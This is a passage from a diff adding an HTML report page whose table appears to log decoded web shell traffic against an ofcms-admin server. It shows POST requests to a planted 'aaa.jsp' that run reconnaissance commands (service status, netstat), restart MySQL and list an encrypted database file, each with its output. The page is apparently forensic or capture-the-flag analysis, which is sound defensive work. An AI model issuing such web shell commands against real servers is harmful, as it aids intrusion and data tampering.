eRsrCER5lEQkze72eKUlNkh03kuQJZHSHm4dsG1hBWzfFoLHvaQIyky3aNtIVkNXS46w1E7HqjvcX52UHnBeRSLpuz4h86qa5F63G52jkPeHspCiiQTwYcsnF8hmyL9pOZmME8IRckurjCyK9TFnffAmDbTm3mVdnjfuc3fIlbCEvBCU7I6ZMsl8BusqnI9WUuD4QBp68RsYDqRNaa6RbvmS9fasanopJonTx5QjOBZ5y9tJg4yroZl9nBr1NQ76OzKYDbLtmdnJ8gTOLvabFbB7KiJUZEb3ZtMfLagm4D2942NEi6mJUAAlDSCy1UPoc6UtKnbprRSnLMIltKMpSAT1wQyi7CLocLdriRvaFxxU1Hn8YgysROtOZnJqb02bBC1EI8kPq04ReRF7pfa26Xd3ocvXLi8YnnctrfrUlJ9QZPtsI8uWWPWzouYigjGghrMDp5svOojkj3XZXj4Jv9wEUyhGz5u8sopgIIunkJkttmF0duyQaFpdajSoROVwmYD9C9nGdeyvb5sMqXykzyCqciEODB6ZRuCzYbyu19OWz0MXmuKTkHF19PRdiF05fktJamqZ0rISi7TJUH0kx1iWly4qJ7uoLkF3crgzGq1iIAU87g1MAv4n21Lifjt6m9MKMLLpc8gyaL3QJIbs5vDBOWdQUYGj25FMVYaaFS3HV09feJtpbI42XeJq5vML5EclTTQSIwfaJvmQMjVrvnFTfKdrfo0piXzNNHE5Ddv6X'}</td>
+      <td>200</td>
+      <td>{'status': 'success', 'msg': '6bDQZJac63bi8G5vJQqjUaO3t3RJpCTUqyHnXsDUyUmHCuVD1VYufohEZNr06slRA77z1Razx5BhjUogEOnUiN1NrPwW149XoL4GHsZccPGGi9A8bx70FwItUutqjuFk9eZBvBhCAqS12W8V90NVmpfWYvjF6uywzC82CSn9PH04V6oD6QOmsM1lo2gI8u18Y0C6U8WYOvHSEIoIvzEbXETOVKppl1NEi1I1nbQbWCvBFdhcn0qWxidULxIW5Ak9jumWP9xKIvKEDUNzVWtuA4nPhAIg5VFbQ5f54fV99qGiQAENGfftoCPPbKoqeZP6128ViarGMLusvm5IN2LDfxeodx4fUcMZxUqH1mXD6i0LhQSYGpGlSftQfgFXi6Ce5g5YexdafHQawrHh41cPXgzjBR6HhQLQPEYD1S05EuTAKOqNcz2ikJenaVQp5EddMfyLk3UU0Du2WQ5ojRDidzQeydYHH7DDgVJTAyNtrKS7SpLMyReRsEJ40yUyZ0LmF4av0GJsCb2BsHZqiq6iWsOprjOmI9stTsZuQqZdvrgu8EbqfN9z5bPzeU3ZVa84apB4Du1cFESzWGLnCSZ2tYIN29PGBF1oBJ5I5aR7mhHMakZOMuJiGGASrK2uuvuq8HJk5TmLiRGreExLZ3ucY1NiMee83ch6gi5zh9SO48erhl0jNr1vsJ3GuraD820dW9exGbSbe4SWjpXz9kzCWxXaIaXh5nr0vWap9dQhZiu9oO6ZvqCfq8VSHt4o0PV5Cj9tQd8QLnJTXDJlEBQ14GJ49nZBpqIwjpC45waHaHgJW8mFfBc0Wv0FrDpqLNEX9O0dHtKhZ1bm8gZViGOfjpAHWpBPOaeKddBNNAnEwC3nfk5NoYu6vRXBVWT5uzqGslOBvdOyIgn18Ui3FGwEkafxTUkgTRY8DGQUELPd1zj30Oe8B0r1uswXcaDfpK020JCNhW4z0meIzCwhGT6EVfzUlwurdMrvioWlYLVMcmrnc7cWWwunxeRsrCER5lEQkze72eKUlNkh03kuQJZHSHm4dsG1hBWzfFoLHvaQIyky3aNtIVkNXS46w1E7HqjvcX52UHnBeRSLpuz4h86qa5F63G52jkPeHspCiiQTwYcsnF8hmyL9pOZmME8IRckurjCyK9TFnffAmDbTm3mVdnjfuc3fIlbCEvBCU7I6ZMsl8BusqnI9WUuD4QBp68RsYDqRNaa6RbvmS9fasanopJonTx5QjOBZ5y9tJg4yroZl9nBr1NQ76OzKYDbLtmdnJ8gTOLvabFbB7KiJUZEb3ZtMfLagm4D2942NEi6mJUAAlDSCy1UPoc6UtKnbprRSnLMIltKMpSAT1wQyi7CLocLdriRvaFxxU1Hn8YgysROtOZnJqb02bBC1EI8kPq04ReRF7pfa26Xd3ocvXLi8YnnctrfrUlJ9QZPtsI8uWWPWzouYigjGghrMDp5svOojkj3XZXj4Jv9wEUyhGz5u8sopgIIunkJkttmF0duyQaFpdajSoROVwmYD9C9nGdeyvb5sMqXykzyCqciEODB6ZRuCzYbyu19OWz0MXmuKTkHF19PRdiF05fktJamqZ0rISi7TJUH0kx1iWly4qJ7uoLkF3crgzGq1iIAU87g1MAv4n21Lifjt6m9MKMLLpc8gyaL3QJIbs5vDBOWdQUYGj25FMVYaaFS3HV09feJtpbI42XeJq5vML5EclTTQSIwfaJvmQMjVrvnFTfKdrfo0piXzNNHE5Ddv6X'}</td>
+    </tr>
+    <tr>
+      <th>40</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd /var/lib/mysql/secret/ ;service --status-all', 'path': '/var/lib/mysql/secret/'}</td>
+      <td>200</td>
+      <td>{'msg': ' [ - ]  dbus
+ [ + ]  mysql
+ [ - ]  procps
+ [ + ]  redis-server
+ [ + ]  ssh
+ [ - ]  x11-common
+ [ ? ]  hwclock.sh
+', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>41</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd /var/lib/mysql/secret/ ;netstat -antlp', 'path': '/var/lib/mysql/secret/'}</td>
+      <td>200</td>
+      <td>{'msg': 'Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      277/redis-server 0. 
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      290/java            
+tcp        0      0 0.0.0.0:33060           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      266/sshd: /usr/sbin 
+tcp        0      0 127.0.0.1:8005          0.0.0.0:*               LISTEN      290/java            
+tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      290/java            
+tcp        0      0 127.0.0.1:3306          127.0.0.1:55490         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:35170         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:3306          127.0.0.1:33176         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:3306          127.0.0.1:35170         ESTABLISHED -                   
+tcp        0      0 172.17.0.2:8080         192.168.2.1:37990       ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:3306          127.0.0.1:35162         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:3306          127.0.0.1:58710         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:35252         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:33176         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:55490         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:35162         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:3306          127.0.0.1:35252         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:58710         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp6       0      0 :::22                   :::*                    LISTEN      266/sshd: /usr/sbin 
+', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>42</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd /var/lib/mysql/secret/ ;service mysql restart', 'path': '/var/lib/mysql/secret/'}</td>
+      <td>200</td>
+      <td>{'msg': ' * Stopping MySQL database server mysqld
+   ...done.
+ * Starting MySQL database server mysqld
+   ...done.
+su: warning: cannot change directory to /nonexistent: No such file or directory
+', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>43</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/lib/mysql/secret/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '114688', 'perm': 'rw-r-----', 'name': 'secret.ibd.enc', 'lastModified': '2024/12/08 02:50:07', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+  </tbody>
+</table>
+            </div>
+        </div>
+    
+        <script>
+            $(document).ready(function() {
+                $('table').DataTable();
+            });
+        </script>
+    </body>
+    </html>
+    
